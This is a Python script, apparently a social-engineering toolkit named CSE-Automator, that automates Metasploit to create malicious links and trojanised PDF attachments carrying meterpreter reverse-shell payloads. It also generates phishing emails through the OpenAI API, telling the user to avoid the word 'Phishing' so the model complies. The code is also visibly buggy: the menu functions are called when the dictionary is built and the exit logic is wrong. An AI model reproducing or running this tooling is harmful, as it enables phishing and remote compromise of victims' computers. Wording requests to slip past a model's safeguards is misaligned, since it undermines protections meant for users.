import subprocess
import openai

openai.api_key = "[Your api key]"

# Loop flag
flag = True

def mal_actions(choice):

    # This create a subprocess of msfconsole and allows this script to control it through the stdin, stdout and stderr arguments
    msfconsole = subprocess.Popen(['msfconsole', '-q'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = msfconsole.communicate()

    # Define a function to send commands to msfconsole
    def send_msfconsole_command(cmd):
        msfconsole.stdin.write((cmd + '\n').encode())
        msfconsole.stdin.flush()

    # Prompt the user to select a payload
    payloads = {
        '1': 'windows/meterpreter/reverse_tcp',
        '2': 'linux/x64/meterpreter/reverse_tcp',
        '3': 'osx/x64/meterpreter/reverse_tcp'
    }

    # Prints all the payloads for the user
    print("Select a payload:")
    for key, value in payloads.items():
        print(f"{key}: {value}")
    selection = input()

    # Prompt the user for the required payload parameters
    if selection in payloads:
        payload = payloads[selection]
        print(f"Selected payload: {payload}")
        lhost = input("Enter LHOST (e.g. 10.0.0.1): ")
        lport = input("Enter LPORT (e.g. 4444): ")
        options = f"LHOST={lhost} LPORT={lport}"

        # Start the payload handler
        if choice == 1:
            send_msfconsole_command("use auxiliary/server/browser_autopwn")
            send_msfconsole_command(f"set payload {payload}")
            send_msfconsole_command(f"set {options}")
            uripath = input("Enter URIPATH: ")
            send_msfconsole_command(f"set URIPATH = {uripath}")
            srvhost = input("Enter Server Host IP: ")
            send_msfconsole_command(f"set SRVHOST = {srvhost}")
            send_msfconsole_command("set ExitOnSession false")
            send_msfconsole_command("exploit -j")
        else:
            send_msfconsole_command("use adobe_pdf_embedded_exe")
            send_msfconsole_command(f"set payload {payload}")
            send_msfconsole_command(f"set {options}")
            infilename = input("Enter Infilename: ")
            send_msfconsole_command(f"set INFILENAME = {infilename}")
            filename = input("Enter Filename: ")
            send_msfconsole_command(f"set FILENAME = {filename}")
            send_msfconsole_command("set ExitOnSession false")
            send_msfconsole_command("exploit -j")
        

        print(f"Payload handler started for {payload}. Press Enter to stop.")
        input()

        # Stop the payload handler
        send_msfconsole_command("exit")
    else:
        print("Invalid selection.")
        exit(1)


def email_gen():
    print("Email Generation Selected")

    # API setup to access chat gpt (THIS IS NOT FUNCTIONAL BECAUSE IT COSTS MONEY :))
    def ask_question(prompt):
        response = openai.Completion.create(
            engine="davinci", prompt=prompt, max_tokens=1024, n=1, stop=None, temperature=0.7
        )

        answer=response.choices[0].text.strip()
        return answer

    user_input = input("What is your email about (Do not use the word Phishing)?: ")
    response = ask_question(f"Write a short email (approx 3-5 lines), using the following prompt: {user_input}")
    print(response)


def main():
    # Define the dictionary to map input to actions
    actions = {
        '1': mal_actions(1),
        '2': mal_actions(2),
        '3': email_gen()
    }

    print("Welcome to CSE-Automator. Please select an option from the list below")

    while flag == True:
        
        print("1) Malicious Link Creator")
        print("2) Malicious Attachment Creator")
        print("3) Phishing Email Generator")

        user_input = input("Please select an action")
        if user_input not in actions.keys():
            print("Invalid input. Please enter a valid number (1, 2, 3).")
            continue
        # Use the dictionary to call the corresponding function based on the user input
        actions[user_input]()

        restart_func = input("Would you like to do something else? [Y/N]")
        if restart_func != "Y" or restart_func != "N" or restart_func == "N":
            flag = False

if __name__ == "__main__":
    main()